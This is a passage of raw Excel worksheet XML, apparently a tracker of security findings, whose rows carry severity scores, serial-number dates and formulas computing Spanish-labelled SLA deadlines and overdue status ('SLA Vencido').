      <c r="L467" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M467" t="s">
        <v>61</v>
      </c>
      <c r="N467">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q467" t="s">
        <v>1772</v>
      </c>
      <c r="T467" s="1">
        <v>45857</v>
      </c>
      <c r="U467" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V467" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W467" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB467" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC467" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE467" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG467" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="468" spans="1:33" ht="30" x14ac:dyDescent="0.45">
      <c r="A468" s="5">
        <v>467</v>
      </c>
      <c r="B468" t="s">
        <v>32</v>
      </c>
      <c r="C468" t="s">
        <v>225</v>
      </c>
      <c r="D468" t="s">
        <v>34</v>
      </c>
      <c r="G468" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H468" t="s">
        <v>1780</v>
      </c>
      <c r="J468" t="s">
        <v>560</v>
      </c>
      <c r="L468" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M468" t="s">
        <v>61</v>
      </c>
      <c r="N468">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q468" t="s">
        <v>1772</v>
      </c>
      <c r="T468" s="1">
        <v>45857</v>
      </c>
      <c r="U468" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V468" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W468" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB468" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC468" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE468" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG468" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="469" spans="1:33" ht="30" x14ac:dyDescent="0.45">
      <c r="A469" s="5">
        <v>468</v>
      </c>
      <c r="B469" t="s">
        <v>32</v>
      </c>
      <c r="C469" t="s">
        <v>225</v>
      </c>
      <c r="D469" t="s">
        <v>34</v>
      </c>
      <c r="G469" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H469" t="s">
        <v>1782</v>
      </c>
      <c r="J469" t="s">
        <v>560</v>
      </c>
      <c r="L469" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M469" t="s">
        <v>61</v>
      </c>
      <c r="N469">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q469" t="s">
        <v>1772</v>
      </c>
      <c r="T469" s="1">
        <v>45857</v>
      </c>
      <c r="U469" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V469" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W469" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB469" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC469" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE469" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG469" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="470" spans="1:33" ht="30" x14ac:dyDescent="0.45">
      <c r="A470" s="5">
        <v>469</v>
      </c>
      <c r="B470" t="s">
        <v>32</v>
      </c>
      <c r="C470" t="s">
        <v>225</v>
      </c>
      <c r="D470" t="s">
        <v>34</v>
      </c>
      <c r="G470" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H470" t="s">
        <v>1783</v>
      </c>
      <c r="J470" t="s">
        <v>560</v>
      </c>
      <c r="L470" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M470" t="s">
        <v>61</v>
      </c>
      <c r="N470">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q470" t="s">
        <v>1772</v>
      </c>
      <c r="T470" s="1">
        <v>45857</v>
      </c>
      <c r="U470" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V470" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W470" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB470" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC470" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE470" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG470" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="471" spans="1:33" ht="30" x14ac:dyDescent="0.45">
      <c r="A471" s="5">
        <v>470</v>
      </c>
      <c r="B471" t="s">
        <v>32</v>
      </c>
      <c r="C471" t="s">
        <v>225</v>
      </c>
      <c r="D471" t="s">
        <v>34</v>
      </c>
      <c r="G471" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H471" t="s">
        <v>1784</v>
      </c>
      <c r="J471" t="s">
        <v>560</v>
      </c>
      <c r="L471" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M471" t="s">
        <v>61</v>
      </c>
      <c r="N471">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q471" t="s">
        <v>1772</v>
      </c>
      <c r="T471" s="1">
        <v>45857</v>
      </c>
      <c r="U471" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V471" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W471" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB471" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC471" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE471" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG471" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="472" spans="1:33" ht="30" x14ac:dyDescent="0.45">
      <c r="A472" s="5">
        <v>471</v>
      </c>
      <c r="B472" t="s">
        <v>32</v>
      </c>
      <c r="C472" t="s">
        <v>225</v>
      </c>
      <c r="D472" t="s">
        <v>34</v>
      </c>
      <c r="G472" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H472" t="s">
        <v>1785</v>
      </c>
      <c r="J472" t="s">
        <v>560</v>
      </c>
      <c r="L472" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M472" t="s">
        <v>61</v>
      </c>
      <c r="N472">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q472" t="s">
        <v>1772</v>
      </c>
      <c r="T472" s="1">
        <v>45857</v>
      </c>
      <c r="U472" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V472" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W472" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB472" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC472" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE472" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG472" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="473" spans="1:33" ht="30" x14ac:dyDescent="0.45">
      <c r="A473" s="5">
        <v>472</v>
      </c>
      <c r="B473" t="s">
        <v>32</v>
      </c>
      <c r="C473" t="s">
        <v>225</v>
      </c>
      <c r="D473" t="s">
        <v>34</v>
      </c>
      <c r="G473" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H473" t="s">
        <v>1786</v>
      </c>
      <c r="J473" t="s">
        <v>560</v>
      </c>
      <c r="L473" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M473" t="s">
        <v>61</v>
      </c>
      <c r="N473">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q473" t="s">
        <v>1772</v>
      </c>
      <c r="T473" s="1">
        <v>45857</v>
      </c>
      <c r="U473" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V473" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W473" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB473" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC473" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE473" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG473" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="474" spans="1:33" ht="30" x14ac:dyDescent="0.45">
      <c r="A474" s="5">
        <v>473</v>
      </c>
      <c r="B474" t="s">
        <v>32</v>
      </c>
      <c r="C474" t="s">
        <v>225</v>
      </c>
      <c r="D474" t="s">
        <v>34</v>
      </c>
      <c r="G474" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H474" t="s">
        <v>1787</v>
      </c>
      <c r="J474" t="s">
        <v>560</v>
      </c>
      <c r="L474" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M474" t="s">
        <v>61</v>
      </c>
      <c r="N474">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q474" t="s">
        <v>1772</v>
      </c>
      <c r="T474" s="1">
        <v>45857</v>
      </c>
      <c r="U474" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V474" s="1">
        <f t="shared" ref="V474:V505" si="26">IF(M474="Critical",T474+10,IF(M474="High",T474+30,IF(M474="Bad",T474+30,IF(M474="Medium",T474+90,IF(M474="Warm",T474+90,IF(M474="Low",T474+120,IF(M474="Fair",T474+120,IF(M474="Neutral",T474+120,""))))))))</f>
        <v>45947</v>
      </c>
      <c r="W474" s="56" t="str">
        <f t="shared" ref="W474:W505" ca="1" si="27">IF(M474="Critical",IF(U474&gt;10,"SLA Vencido","En SLA"),IF(M474="High",IF(U474&gt;30,"SLA Vencido","En SLA"),IF(M474="Bad",IF(U474&gt;30,"SLA Vencido","En SLA"),IF(M474="Medium",IF(U474&gt;90,"SLA Vencido","En SLA"),IF(M474="Warm",IF(U474&gt;90,"SLA Vencido","En SLA"),IF(M474="Low",IF(U474&gt;120,"SLA Vencido","En SLA"),IF(M474="Fair",IF(U474&gt;120,"SLA Vencido","En SLA"),IF(M474="Neutral",IF(U474&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB474" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC474" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE474" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG474" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="475" spans="1:33" ht="59" x14ac:dyDescent="0.45">
      <c r="A475" s="5">
        <v>474</v>
      </c>
      <c r="B475" t="s">
        <v>32</v>
      </c>
      <c r="C475" t="s">
        <v>225</v>
      </c>
      <c r="D475" t="s">
        <v>34</v>
      </c>
      <c r="G475" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H475" t="s">
        <v>1788</v>
      </c>
      <c r="J475" t="s">
        <v>574</v>
      </c>
      <c r="L475" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M475" t="s">
        <v>61</v>
      </c>
      <c r="N475">
        <v>5.2</v>
      </c>
      <c r="Q475" t="s">
        <v>1772</v>
      </c>
      <c r="T475" s="1">
        <v>45857</v>
      </c>
      <c r="U475" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V475" s="1">
        <f t="shared" si="26"/>
        <v>45947</v>
      </c>
      <c r="W475" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB475" s="69" t="s">
        <v>1789</v>
      </c>
      <c r="AC475" s="65" t="s">
        <v>1790</v>
      </c>
      <c r="AE475" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG475" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="476" spans="1:33" ht="44.5" x14ac:dyDescent="0.45">
      <c r="A476" s="5">
        <v>475</v>
      </c>
      <c r="B476" t="s">
        <v>32</v>
      </c>
      <c r="C476" t="s">
        <v>225</v>
      </c>
      <c r="D476" t="s">
        <v>34</v>
      </c>
      <c r="G476" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H476" t="s">
        <v>1791</v>
      </c>
      <c r="J476" t="s">
        <v>1325</v>
      </c>
      <c r="L476" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M476" t="s">
        <v>61</v>
      </c>
      <c r="N476">
        <v>4.7</v>
      </c>
      <c r="Q476" t="s">
        <v>1792</v>
      </c>
      <c r="T476" s="1">
        <v>45857</v>
      </c>
      <c r="U476" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V476" s="1">
        <f t="shared" si="26"/>
        <v>45947</v>
      </c>
      <c r="W476" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB476" s="69" t="s">
        <v>1793</v>
      </c>
      <c r="AC476" s="65" t="s">
        <v>1794</v>
      </c>
      <c r="AE476" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG476" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="477" spans="1:33" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A477" s="5">
        <v>476</v>
      </c>
      <c r="B477" t="s">
        <v>32</v>
      </c>
      <c r="C477" t="s">
        <v>225</v>
      </c>
      <c r="D477" t="s">
        <v>34</v>
      </c>
      <c r="G477" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H477" t="s">
        <v>1795</v>
      </c>
      <c r="J477" t="s">
        <v>971</v>
      </c>
      <c r="L477" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M477" t="s">
        <v>61</v>
      </c>
      <c r="N477">
        <v>5.8</v>
      </c>
      <c r="Q477" t="s">
        <v>1796</v>
      </c>
      <c r="T477" s="1">
        <v>45857</v>
      </c>
      <c r="U477" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V477" s="1">
        <f t="shared" si="26"/>
        <v>45947</v>
      </c>
      <c r="W477" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB477" s="82" t="s">
        <v>1797</v>
      </c>
      <c r="AC477" s="82" t="s">
        <v>1798</v>
      </c>
      <c r="AE477" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG477" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="478" spans="1:33" ht="66" x14ac:dyDescent="0.45">
      <c r="A478" s="5">
        <v>477</v>
      </c>
      <c r="B478" t="s">
        <v>32</v>
      </c>
      <c r="C478" t="s">
        <v>225</v>
      </c>
      <c r="D478" t="s">
        <v>34</v>
      </c>
      <c r="G478" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H478" t="s">
        <v>1799</v>
      </c>
      <c r="J478" t="s">
        <v>1800</v>
      </c>
      <c r="L478" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M478" t="s">
        <v>61</v>
      </c>
      <c r="N478">
        <v>5.8</v>
      </c>
      <c r="Q478" t="s">
        <v>1796</v>
      </c>
      <c r="T478" s="1">
        <v>45857</v>
      </c>
      <c r="U478" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V478" s="1">
        <f t="shared" si="26"/>
        <v>45947</v>
      </c>
      <c r="W478" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB478" s="82" t="s">
        <v>1801</v>
      </c>
      <c r="AC478" s="69" t="s">
        <v>1802</v>
      </c>
      <c r="AE478" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG478" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="479" spans="1:33" ht="33" x14ac:dyDescent="0.45">
      <c r="A479" s="5">
        <v>478</v>
      </c>
      <c r="B479" t="s">
        <v>32</v>
      </c>
      <c r="C479" t="s">
        <v>225</v>
      </c>
      <c r="D479" t="s">
        <v>34</v>
      </c>
      <c r="G479" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H479" t="s">
        <v>1803</v>
      </c>
      <c r="J479" t="s">
        <v>1804</v>
      </c>
      <c r="L479" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M479" t="s">
        <v>61</v>
      </c>
      <c r="N479">
        <v>5</v>
      </c>
      <c r="Q479" t="s">
        <v>1796</v>
      </c>
      <c r="T479" s="1">
        <v>45857</v>
      </c>
      <c r="U479" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V479" s="1">
        <f t="shared" si="26"/>
        <v>45947</v>
      </c>
      <c r="W479" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB479" s="82" t="s">
        <v>1805</v>
      </c>
      <c r="AC479" s="65" t="s">
        <v>1806</v>
      </c>
      <c r="AE479" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG479" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="480" spans="1:33" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A480" s="5">
        <v>479</v>
      </c>
      <c r="B480" t="s">
        <v>32</v>
      </c>
      <c r="C480" t="s">
        <v>225</v>
      </c>
      <c r="D480" t="s">
        <v>34</v>
      </c>
      <c r="G480" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H480" t="s">
        <v>1807</v>
      </c>
      <c r="J480" t="s">
        <v>1390</v>
      </c>
      <c r="L480" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M480" t="s">
        <v>61</v>
      </c>
      <c r="N480">
        <v>4.7</v>
      </c>
      <c r="Q480" t="s">
        <v>1796</v>
      </c>
      <c r="T480" s="1">
        <v>45857</v>
      </c>
      <c r="U480" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V480" s="1">
        <f t="shared" si="26"/>
        <v>45947</v>
      </c>
      <c r="W480" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB480" s="82" t="s">
        <v>1808</v>
      </c>
      <c r="AC480" s="82" t="s">
        <v>1809</v>
      </c>
      <c r="AE480" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG480" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="481" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A481" s="5">
        <v>480</v>
      </c>
      <c r="B481" t="s">
        <v>32</v>
      </c>
      <c r="C481" t="s">
        <v>425</v>
      </c>
      <c r="D481" t="s">
        <v>34</v>
      </c>
      <c r="G481" s="52" t="s">
        <v>1084</v>
      </c>
      <c r="J481" t="s">
        <v>1810</v>
      </c>
      <c r="L481" t="s">
        <v>655</v>
      </c>
      <c r="M481" t="s">
        <v>111</v>
      </c>
      <c r="Q481" t="s">
        <v>1811</v>
      </c>
      <c r="T481" s="1">
        <v>45887</v>
      </c>
      <c r="U481" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>322</v>
      </c>
      <c r="V481" s="1">
        <f t="shared" si="26"/>
        <v>46007</v>
      </c>
      <c r="W481" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB481" s="32" t="s">
        <v>1060</v>
      </c>
      <c r="AC481" s="32" t="s">
        <v>1061</v>
      </c>
      <c r="AD481" s="9"/>
      <c r="AE481" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG481" s="51" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="482" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A482" s="5">
        <v>481</v>
      </c>
      <c r="B482" t="s">
        <v>32</v>
      </c>
      <c r="C482" t="s">
        <v>425</v>
      </c>
      <c r="D482" t="s">
        <v>34</v>
      </c>
      <c r="G482" s="52" t="s">
        <v>1084</v>
      </c>
      <c r="J482" t="s">
        <v>1810</v>
      </c>
      <c r="L482" t="s">
        <v>655</v>
      </c>
      <c r="M482" t="s">
        <v>111</v>
      </c>
      <c r="Q482" t="s">
        <v>1812</v>
      </c>
      <c r="T482" s="1">
        <v>45887</v>
      </c>
      <c r="U482" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>322</v>
      </c>
      <c r="V482" s="1">
        <f t="shared" si="26"/>
        <v>46007</v>
      </c>
      <c r="W482" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB482" s="32" t="s">
        <v>1060</v>
      </c>
      <c r="AC482" s="32" t="s">
        <v>1061</v>
      </c>
      <c r="AD482" s="9"/>
      <c r="AE482" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG482" s="51" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="483" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A483" s="5">
        <v>482</v>
      </c>
      <c r="B483" t="s">
        <v>32</v>
      </c>
      <c r="C483" t="s">
        <v>225</v>
      </c>
      <c r="D483" t="s">
        <v>34</v>
      </c>
      <c r="G483" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H483" t="s">
        <v>1813</v>
      </c>
      <c r="J483" t="s">
        <v>971</v>
      </c>
      <c r="L483" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M483" t="s">
        <v>61</v>
      </c>
      <c r="N483" t="s">
        <v>1326</v>
      </c>
      <c r="Q483" t="s">
        <v>1391</v>
      </c>
      <c r="T483" s="1">
        <v>45885</v>
      </c>
      <c r="U483" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>324</v>
      </c>
      <c r="V483" s="1">
        <f t="shared" si="26"/>
        <v>45975</v>
      </c>
      <c r="W483" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB483" t="s">
        <v>1753</v>
      </c>
      <c r="AC483" t="s">
        <v>1754</v>
      </c>
      <c r="AE483" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG483" s="51" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="484" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A484" s="5">
        <v>483</v>
      </c>
      <c r="B484" t="s">
        <v>32</v>
      </c>
      <c r="C484" t="s">
        <v>225</v>
      </c>
      <c r="D484" t="s">
        <v>34</v>
      </c>
      <c r="G484" s="52" t="s">
        <v>171</v>
      </c>
      <c r="H484" t="s">
        <v>1814</v>
      </c>
      <c r="J484" t="s">
        <v>556</v>
      </c>
      <c r="L484" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M484" t="s">
        <v>61</v>
      </c>
      <c r="N484" t="s">
        <v>1514</v>
      </c>
      <c r="Q484" t="s">
        <v>176</v>
      </c>
      <c r="T484" s="1">
        <v>45885</v>
      </c>
      <c r="U484" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>324</v>
      </c>
      <c r="V484" s="1">
        <f t="shared" si="26"/>
        <v>45975</v>
      </c>
      <c r="W484" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB484" t="s">
        <v>1726</v>
      </c>
      <c r="AC484" t="s">
        <v>1727</v>
      </c>
      <c r="AE484" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG484" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="485" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A485" s="5">
        <v>484</v>
      </c>
      <c r="B485" t="s">
        <v>32</v>
      </c>
      <c r="C485" t="s">
        <v>225</v>
      </c>
      <c r="D485" t="s">
        <v>34</v>
      </c>
      <c r="G485" s="52" t="s">
        <v>171</v>
      </c>
      <c r="H485" t="s">
        <v>1815</v>
      </c>
      <c r="J485" t="s">
        <v>560</v>
      </c>
      <c r="L485" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M485" t="s">
        <v>61</v>
      </c>
      <c r="N485" t="s">
        <v>1514</v>
      </c>
      <c r="Q485" t="s">
        <v>176</v>
      </c>
      <c r="T485" s="1">
        <v>45885</v>
      </c>
      <c r="U485" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>324</v>
      </c>
      <c r="V485" s="1">
        <f t="shared" si="26"/>
        <v>45975</v>
      </c>
      <c r="W485" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB485" t="s">
        <v>1733</v>
      </c>
      <c r="AC485" t="s">
        <v>1734</v>
      </c>
      <c r="AE485" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG485" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="486" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A486" s="5">
        <v>485</v>
      </c>
      <c r="B486" t="s">
        <v>32</v>
      </c>
      <c r="C486" t="s">
        <v>33</v>
      </c>
      <c r="D486" t="s">
        <v>34</v>
      </c>
      <c r="G486" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H486" t="s">
        <v>1817</v>
      </c>
      <c r="I486" t="s">
        <v>1818</v>
      </c>
      <c r="J486" t="s">
        <v>1095</v>
      </c>
      <c r="L486" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M486" t="s">
        <v>42</v>
      </c>
      <c r="N486" t="s">
        <v>1819</v>
      </c>
      <c r="Q486" t="s">
        <v>1820</v>
      </c>
      <c r="T486" s="1">
        <v>45883</v>
      </c>
      <c r="U486" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>326</v>
      </c>
      <c r="V486" s="1">
        <f t="shared" si="26"/>
        <v>45893</v>
      </c>
      <c r="W486" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB486" t="s">
        <v>1821</v>
      </c>
      <c r="AC486" t="s">
        <v>1822</v>
      </c>
      <c r="AE486" s="81">
        <v>45891</v>
      </c>
      <c r="AG486" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="487" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A487" s="5">
        <v>486</v>
      </c>
      <c r="B487" t="s">
        <v>32</v>
      </c>
      <c r="C487" t="s">
        <v>33</v>
      </c>
      <c r="D487" t="s">
        <v>34</v>
      </c>
      <c r="G487" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H487" t="s">
        <v>1824</v>
      </c>
      <c r="I487" t="s">
        <v>1825</v>
      </c>
      <c r="J487" t="s">
        <v>1826</v>
      </c>
      <c r="L487" t="s">
        <v>655</v>
      </c>
      <c r="M487" t="s">
        <v>61</v>
      </c>
      <c r="N487" t="s">
        <v>1827</v>
      </c>
      <c r="Q487" t="s">
        <v>1820</v>
      </c>
      <c r="T487" s="1">
        <v>45883</v>
      </c>
      <c r="U487" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>326</v>
      </c>
      <c r="V487" s="1">
        <f t="shared" si="26"/>
        <v>45973</v>
      </c>
      <c r="W487" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB487" t="s">
        <v>1828</v>
      </c>
      <c r="AC487" t="s">
        <v>1829</v>
      </c>
      <c r="AE487" s="81" t="s">
        <v>3463</v>
      </c>
      <c r="AG487" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="488" spans="1:33" ht="44.25" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A488" s="5">
        <v>487</v>
      </c>
      <c r="B488" t="s">
        <v>32</v>
      </c>
      <c r="C488" t="s">
        <v>33</v>
      </c>
      <c r="D488" t="s">
        <v>34</v>
      </c>
      <c r="G488" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H488" t="s">
        <v>1830</v>
      </c>
      <c r="I488" t="s">
        <v>1831</v>
      </c>
      <c r="J488" t="s">
        <v>80</v>
      </c>
      <c r="L488" t="s">
        <v>655</v>
      </c>
      <c r="M488" t="s">
        <v>61</v>
      </c>
      <c r="N488" t="s">
        <v>1832</v>
      </c>
      <c r="Q488" t="s">
        <v>1820</v>
      </c>
      <c r="T488" s="1">
        <v>45883</v>
      </c>
      <c r="U488" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>326</v>
      </c>
      <c r="V488" s="1">
        <f t="shared" si="26"/>
        <v>45973</v>
      </c>
      <c r="W488" s="56" t="str">
        <f t="shared" ca="1" si="27"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB488" t="s">
        <v>1833</v>
      </c>
      <c r="AC488" t="s">
        <v>1834</v>
      </c>
      <c r="AE488" s="81">
        <v>45921</v>
      </c>
      <c r="AG488" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="489" spans="1:33" ht="44.25" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A489" s="5">
        <v>488</v>
      </c>
      <c r="B489" t="s">
        <v>32</v>
      </c>
      <c r="C489" t="s">
        <v>33</v>
      </c>
      <c r="D489" t="s">
        <v>34</v>
      </c>
      <c r="G489" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H489" t="s">
        <v>1835</v>
      </c>
      <c r="I489" t="s">
        <v>1836</v>
      </c>
      <c r="J489" t="s">
        <v>1198</v>
      </c>
      <c r="L489" t="s">
        <v>655</v>
      </c>
      <c r="M489" t="s">
        <v>61</v>
      </c>
      <c r="N489" t="s">
        <v>1837</v>
      </c>
      <c r="Q489" t="s">
        <v>1820</v>
      </c>
      <c r="T489" s="1">
        <v>45883</v>
      </c>
      <c r="U489" s="55">
        <f t="shared" ca="1" si="25"/>
